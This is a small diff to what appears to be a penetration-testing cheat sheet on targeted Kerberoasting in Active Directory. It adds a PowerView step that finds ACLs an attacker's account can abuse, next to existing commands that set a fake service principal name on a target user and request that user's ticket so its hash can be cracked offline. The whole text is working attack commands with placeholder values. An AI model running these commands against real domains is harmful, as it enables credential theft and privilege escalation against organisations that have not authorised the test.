@@ -16,6 +16,10 @@
 
  - targetedKerberoast.py -d DOMAIN -u USER -p PASS (TGS Hash)
 
+ ### Alternate method: Powerview
+
+ - Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "OUR_USER"} (Enumerate interesting ACLs with powerview)
+
  - Set-DomainObject -Identity TARGET_USER -SET @(serviceprincipalname='nonexistent/WHATEVER') (Powerview)
 
  - Get-DomainSPNTicket -SPN nonexistent/WHATEVER (Powerview)
